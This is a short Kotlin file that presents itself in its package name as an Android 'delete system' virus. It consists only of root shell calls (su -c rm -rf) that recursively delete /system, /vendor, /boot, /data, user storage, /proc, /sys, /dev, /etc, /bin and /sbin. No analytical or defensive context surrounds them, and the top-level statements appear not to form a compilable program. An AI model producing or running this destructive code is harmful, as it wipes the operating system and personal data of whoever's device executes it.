package com.delete.system.virus
import android.os.*

Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /system")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /vendor")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /boot")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /data")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /storage/emulated/0")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /proc")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /sys")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /dev")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /etc")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /bin")).waitFor()
Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /sbin")).waitFor()
